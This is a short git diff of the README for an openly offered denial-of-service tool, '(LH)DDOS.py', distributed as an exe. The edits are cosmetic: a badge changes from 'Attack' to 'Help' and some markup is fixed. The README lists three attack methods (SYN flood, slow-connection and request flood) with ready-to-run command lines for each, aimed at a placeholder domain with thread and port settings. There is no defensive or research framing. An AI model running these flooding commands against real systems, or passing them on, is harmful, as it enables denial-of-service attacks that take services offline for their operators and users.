@@ -12,17 +12,15 @@
   <img src="https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white"/>
 </a>
 
-![](https://img.shields.io/badge/Methods-Attack-important)
+![](https://img.shields.io/badge/Methods-Help-important)
 
 **Methods : Synflood - Pyslow - Request**
-
-![](https://img.shields.io/badge/How-Use-important)
 
 **Usage Pyslow Method : python (LH)DDOS.py -d www.example.com -p 80 -T 2000 -Pyslow**
 
 **Usage Synflood Method : python (LH)DDOS.py -d www.example.com -Synflood -T 5000 -t 10.0**
 
-**Usage Request Method : python (LH)DDOS.py -d www.example.com -s 100 -Request
+**Usage Request Method : python (LH)DDOS.py -d www.example.com -s 100 -Request**
 
 **Team : Sharon IV - Sharon VI**
 The software is placed as an exe file to preserve the source code of the software
